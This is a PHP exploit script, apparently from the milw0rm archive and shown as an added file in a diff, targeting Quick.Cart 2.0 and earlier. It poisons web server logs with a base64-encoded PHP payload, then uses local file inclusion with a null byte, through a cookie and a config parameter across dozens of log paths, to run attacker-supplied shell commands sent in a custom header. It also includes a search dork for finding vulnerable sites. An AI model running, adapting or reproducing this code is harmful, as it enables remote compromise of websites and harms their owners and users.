@@ -1,0 +1,294 @@
+<?
+
+print '
+:::::::::  :::::::::: :::     ::: ::::::::::: :::        
+:+:    :+: :+:        :+:     :+:     :+:     :+:        
++:+    +:+ +:+        +:+     +:+     +:+     +:+        
++#+    +:+ +#++:++#   +#+     +:+     +#+     +#+        
++#+    +#+ +#+         +#+   +#+      +#+     +#+        
+#+#    #+# #+#          #+#+#+#       #+#     #+#        
+#########  ##########     ###     ########### ########## 
+::::::::::: ::::::::::     :::     ::::    ::::  
+    :+:     :+:          :+: :+:   +:+:+: :+:+:+ 
+    +:+     +:+         +:+   +:+  +:+ +:+:+ +:+ 
+    +#+     +#++:++#   +#++:++#++: +#+  +:+  +#+ 
+    +#+     +#+        +#+     +#+ +#+       +#+ 
+    #+#     #+#        #+#     #+# #+#       #+# 
+    ###     ########## ###     ### ###       ### 
+	
+   - - [DEVIL TEAM THE BEST POLISH TEAM] - -
+ 
+
+[Exploit name: Quick.Cart <= 2.0 Remote Code Execution Exploit
+[Script name: Quick.Cart v.2.0
+[Script site: http://opensolution.org/?p=Quick.Cart
+dork: "powered by Quick.Cart"
+
+
+
+
+Find by: Kacper (a.k.a Rahim)
+
+
+========>  DEVIL TEAM IRC: irc.milw0rm.com:6667 #devilteam  <========
+========>         http://www.rahim.webd.pl/            <========
+
+Contact: kacper1964@yahoo.pl
+
+(c)od3d by Kacper
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+Greetings DragonHeart and all DEVIL TEAM Patriots :)
+- Leito & Leon 
+TomZen, Gelo, Ramzes, DMX, Ci2u, Larry, @steriod, Drzewko, CrazzyIwan, Rammstein
+Adam., Kicaj., DeathSpeed, Arkadius, Michas, pepi, nukedclx, SkD, MXZ, sysios, 
+mIvus, nukedclx, SkD, wacky, xoron
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+                Greetings for 4ll Fusi0n Group members ;-)
+                and all members of hacker.com.pl ;)
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+';
+
+
+/*
+works with register_globals=On
+
+in file index.php on line 33:
+....
+require_once DIR_LANG.LANGUAGE.'.php';     // <------------------{1}
+....
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+in config/general.php on line 23-32:
+....
+if( isset( $sLang ) && is_file( $config['dir_lang'].$sLang.'.php' ) ){
+  setCookie( 'sLanguage', $sLang, time( ) + 86400 );     // <------------------{2}
+  define( 'LANGUAGE', $sLang );            // <------------------{3}
+}
+else{
+  if( isset( $_COOKIE['sLanguage'] ) )
+    define( 'LANGUAGE', $_COOKIE['sLanguage'] );
+  else
+    define( 'LANGUAGE', $config['default_lang'] );
+}
+
+....
+2# -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+
+in actions_client/gallery.php on line 1-7:
+....
+<?php
+require_once DIR_CORE.'files-'.$config['db_type'].'.php';
+require_once DIR_CORE.'files.php';
+
+require_once DIR_CORE.'products-'.$config['db_type'].'.php';
+require_once DIR_CORE.'products.php';
+....
+
+
+*/
+
+
+if ($argc<4) {
+print_r('
+-----------------------------------------------------------------------------
+Usage: php '.$argv[0].' host path cmd OPTIONS
+host:      target server (ip/hostname)
+path:      Quick.Cart path
+cmd:       a shell command (ls -la)
+Options:
+ -p[port]:    specify a port other than 80
+ -P[ip:port]: specify a proxy
+Example:
+php '.$argv[0].' 2.2.2.2 /Quick.Cart/ ls -la -P1.1.1.1:80
+php '.$argv[0].' 1.1.1.1 / ls -la
+-----------------------------------------------------------------------------
+');
+
+die;
+}
+
+error_reporting(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",5);
+function sendpacket($packet)
+{
+  global $proxy, $host, $port, $html, $proxy_regex;
+  if ($proxy=='') {
+    $ock=fsockopen(gethostbyname($host),$port);
+    if (!$ock) {
+      echo 'No response from '.$host.':'.$port; die;
+    }
+  }
+  else {
+	$c = preg_match($proxy_regex,$proxy);
+    if (!$c) {
+      echo 'Not a valid proxy...';die;
+    }
+    $parts=explode(':',$proxy);
+    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
+    $ock=fsockopen($parts[0],$parts[1]);
+    if (!$ock) {
+      echo 'No response from proxy...';die;
+	}
+  }
+  fputs($ock,$packet);
+  if ($proxy=='') {
+    $html='';
+    while (!feof($ock)) {
+      $html.=fgets($ock);
+    }
+  }
+  else {
+    $html='';
+    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
+      $html.=fread($ock,1);
+    }
+  }
+  fclose($ock);
+}
+function quick_dump($string)
+{
+  $result='';$exa='';$cont=0;
+  for ($i=0; $i<=strlen($string)-1; $i++)
+  {
+   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
+   {$result.="  .";}
+   else
+   {$result.="  ".$string[$i];}
+   if (strlen(dechex(ord($string[$i])))==2)
+   {$exa.=" ".dechex(ord($string[$i]));}
+   else
+   {$exa.=" 0".dechex(ord($string[$i]));}
+   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
+  }
+ return $exa."\r\n".$result;
+}
+$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
+
+function make_seed()
+{
+   list($usec, $sec) = explode(' ', microtime());
+   return (float) $sec + ((float) $usec * 100000);
+}
+
+$host=$argv[1];
+$path=$argv[2];
+$cmd="";
+
+$port=80;
+$proxy="";
+for ($i=3; $i<$argc; $i++){
+$temp=$argv[$i][0].$argv[$i][1];
+if (($temp<>"-p") and ($temp<>"-P")) {$cmd.=" ".$argv[$i];}
+if ($temp=="-p")
+{
+  $port=str_replace("-p","",$argv[$i]);
+}
+if ($temp=="-P")
+{
+  $proxy=str_replace("-P","",$argv[$i]);
+}
+}
+if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}
+
+
+echo "insert evil code in logfiles ...\r\n\r\n";
+$hauru = base64_decode("PD9waHAgb2JfY2xlYW4oKTsvL1J1Y2hvbXkgemFtZWsgSGF1cnUgOy0pZWNobyIuL".
+"i5IYWNrZXIuLkthY3Blci4uTWFkZS4uaW4uLlBvbGFuZCEhLi4uREVWSUwuVEVBTS".
+"4udGhlLi5iZXN0Li5wb2xpc2guLnRlYW0uLkdyZWV0ei4uLiI7ZWNobyIuLi5HbyB".
+"UbyBERVZJTCBURUFNIElSQzogNzIuMjAuMTguNjo2NjY3ICNkZXZpbHRlYW0iO2Vj".
+"aG8iLi4uREVWSUwgVEVBTSBTSVRFOiBodHRwOi8vd3d3LnJhaGltLndlYmQucGwvI".
+"jtpbmlfc2V0KCJtYXhfZXhlY3V0aW9uX3RpbWUiLDApO2VjaG8gIkhhdXJ1IjtwYX".
+"NzdGhydSgkX1NFUlZFUltIVFRQX0hBVVJVXSk7ZGllOz8+");
+
+
+$packet="GET ".$p.$hauru." HTTP/1.0\r\n";
+$packet.="User-Agent: ".$hauru." Googlebot/2.1\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: close\r\n\r\n";
+sendpacket($packet);
+sleep(3);
+
+$paths= array (
+"../../../../../var/log/httpd/access_log",
+"../../../../../var/log/httpd/error_log",
+"../apache/logs/error.log",
+"../apache/logs/access.log",
+"../../apache/logs/error.log",
+"../../apache/logs/access.log",
+"../../../apache/logs/error.log",
+"../../../apache/logs/access.log",
+"../../../../apache/logs/error.log",
+"../../../../apache/logs/access.log",
+"../../../../../apache/logs/error.log",
+"../../../../../apache/logs/access.log",
+"../logs/error.log",
+"../logs/access.log",
+"../../logs/error.log",
+"../../logs/access.log",
+"../../../logs/error.log",
+"../../../logs/access.log",
+"../../../../logs/error.log",
+"../../../../logs/access.log",
+"../../../../../logs/error.log",
+"../../../../../logs/access.log",
+"../../../../../etc/httpd/logs/access_log",
+"../../../../../etc/httpd/logs/access.log",
+"../../../../../etc/httpd/logs/error_log",
+"../../../../../etc/httpd/logs/error.log",
+"../../../../../var/www/logs/access_log",
+"../../../../../var/www/logs/access.log",
+"../../../../../usr/local/apache/logs/access_log",
+"../../../../../usr/local/apache/logs/access.log",
+"../../../../../var/log/apache/access_log",
+"../../../../../var/log/apache/access.log",
+"../../../../../var/log/access_log",
+"../../../../../var/www/logs/error_log",
+"../../../../../var/www/logs/error.log",
+"../../../../../usr/local/apache/logs/error_log",
+"../../../../../usr/local/apache/logs/error.log",
+"../../../../../var/log/apache/error_log",
+"../../../../../var/log/apache/error.log",
+"../../../../../var/log/access_log",
+"../../../../../var/log/error_log"
+);
+
+for ($i=0; $i<=count($paths)-1; $i++)
+{
+$a=$i+2;
+echo "[".$a."] Check Path: ".$paths[$i]."\r\n";
+echo "remote code execution...wait..\n";
+$packet ="GET ".$p."index.php HTTP/1.1\r\n";
+$packet.="Cookie: sLanguage=../".$paths[$i]."%00;\r\n";
+$packet.="HAURU: ".$cmd."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacket($packet);
+if (strstr($html,"Hauru"))
+{
+$temp=explode("Hauru",$html);
+die($temp[1]);
+}
+}
+for ($i=0; $i<=count($paths)-1; $i++)
+{
+$a=$i+2;
+echo "[".$a."] Check Path: ".$paths[$i]."\r\n";
+echo "remote code execution...wait..\n";
+$packet ="GET ".$p."actions_client/gallery.php?config[db_type]=../".$paths[$i]."%00 HTTP/1.1\r\n";
+$packet.="HAURU: ".$cmd."\r\n";
+$packet.="Host: ".$host."\r\n";
+$packet.="Connection: Close\r\n\r\n";
+sendpacket($packet);
+if (strstr($html,"Hauru"))
+{
+$temp=explode("Hauru",$html);
+die($temp[1]);
+}
+}
+echo "Exploit err0r :(\r\n";
+echo "Go to DEVIL TEAM IRC: 72.20.18.6:6667 #devilteam\r\n";
+?>
+
+# milw0rm.com [2006-11-13]
